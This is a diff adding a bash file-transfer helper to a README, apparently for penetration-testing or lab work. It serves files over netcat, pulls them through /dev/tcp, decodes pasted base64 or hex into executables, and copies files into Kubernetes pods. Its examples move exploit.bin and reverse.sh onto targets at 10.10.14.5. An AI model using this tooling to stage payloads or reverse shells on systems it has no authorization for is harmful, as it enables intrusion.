@@ -1,5 +1,130 @@
 
 
+```
+xfer send exploit.bin 10.10.14.5
+xfer base64-encode payload.sh > payload.b64
+xfer kubectl-cp reverse.sh wordpress-pod default /tmp
+```
+
+##
+##
+
+```
+#!/bin/bash
+
+set -euo pipefail
+
+RED=$(tput setaf 1)
+GRN=$(tput setaf 2)
+YEL=$(tput setaf 3)
+BLU=$(tput setaf 4)
+RST=$(tput sgr0)
+
+function usage() {
+  cat <<EOF
+Usage:
+  $0 send <file> <target_ip> [port]
+  $0 receive <source_ip> <port> <output_file>
+  $0 base64-encode <file>
+  $0 base64-decode
+  $0 hex-encode <file>
+  $0 hex-decode
+  $0 kubectl-cp <file> <pod> <namespace> <dest_path>
+  $0 rsync <source> <user@host:/dest>
+
+Examples:
+  $0 send payload.bin 10.10.14.5 9000
+  $0 receive 10.10.14.5 9000 output.bin
+  $0 base64-encode your_binary
+  $0 hex-decode < paste hex and CTRL+D
+  $0 kubectl-cp ./exploit.sh wordpress-123 abc /tmp
+EOF
+}
+
+function send_file() {
+  local FILE="$1"
+  local IP="$2"
+  local PORT="${3:-8000}"
+  echo "[${GRN}+${RST}] Serving '$FILE' on TCP $PORT..."
+  nc -lvnp "$PORT" < "$FILE"
+}
+
+function receive_file() {
+  local HOST="$1"
+  local PORT="$2"
+  local OUT="$3"
+  echo "[${GRN}+${RST}] Connecting to $HOST:$PORT to receive '$OUT'..."
+  exec 3<>/dev/tcp/"$HOST"/"$PORT"
+  cat <&3 > "$OUT"
+  exec 3<&- 3>&-
+  echo "[${GRN}+${RST}] Received '$OUT'."
+  chmod +x "$OUT" 2>/dev/null || true
+}
+
+function base64_encode() {
+  local FILE="$1"
+  echo "[${GRN}+${RST}] Encoding $FILE to base64..."
+  base64 "$FILE"
+}
+
+function base64_decode() {
+  echo "[${YEL}!${RST}] Paste base64 content below, then CTRL+D:"
+  base64 -d > decoded_file
+  chmod +x decoded_file 2>/dev/null || true
+  echo "[${GRN}+${RST}] Saved decoded file as 'decoded_file'"
+}
+
+function hex_encode() {
+  local FILE="$1"
+  echo "[${GRN}+${RST}] Encoding $FILE to hex..."
+  xxd -p "$FILE"
+}
+
+function hex_decode() {
+  echo "[${YEL}!${RST}] Paste hex content below, then CTRL+D:"
+  xxd -r -p > decoded_file
+  chmod +x decoded_file 2>/dev/null || true
+  echo "[${GRN}+${RST}] Saved decoded file as 'decoded_file'"
+}
+
+function k8s_copy() {
+  local FILE="$1"
+  local POD="$2"
+  local NAMESPACE="$3"
+  local DEST="$4"
+  echo "[${GRN}+${RST}] Copying '$FILE' into pod '$POD' namespace '$NAMESPACE' -> $DEST"
+  kubectl cp "$FILE" "$NAMESPACE/$POD:$DEST"
+  kubectl exec -n "$NAMESPACE" "$POD" -- chmod +x "$DEST/$(basename "$FILE")"
+}
+
+function fast_rsync() {
+  local SRC="$1"
+  local DEST="$2"
+  echo "[${GRN}+${RST}] Fast rsync from '$SRC' to '$DEST'"
+  rsync -aHAXxv --numeric-ids --delete --progress \
+    -e "ssh -T -c arcfour -o Compression=no -x" "$SRC" "$DEST"
+}
+
+#### MAIN ####
+
+[[ $# -lt 1 ]] && usage && exit 1
+
+CMD="$1"; shift
+
+case "$CMD" in
+  send)             [[ $# -lt 2 ]] && usage && exit 1; send_file "$@" ;;
+  receive)          [[ $# -lt 3 ]] && usage && exit 1; receive_file "$@" ;;
+  base64-encode)    [[ $# -ne 1 ]] && usage && exit 1; base64_encode "$1" ;;
+  base64-decode)    base64_decode ;;
+  hex-encode)       [[ $# -ne 1 ]] && usage && exit 1; hex_encode "$1" ;;
+  hex-decode)       hex_decode ;;
+  kubectl-cp)       [[ $# -ne 4 ]] && usage && exit 1; k8s_copy "$@" ;;
+  rsync)            [[ $# -ne 2 ]] && usage && exit 1; fast_rsync "$@" ;;
+  *)                echo "[${RED}ERR${RST}] Unknown command: $CMD"; usage; exit 1 ;;
+esac
+
+```
+
 ## 🛰️ Modern File Transfer Toolkit
 
 ### 🔹 `transfer_file.sh`
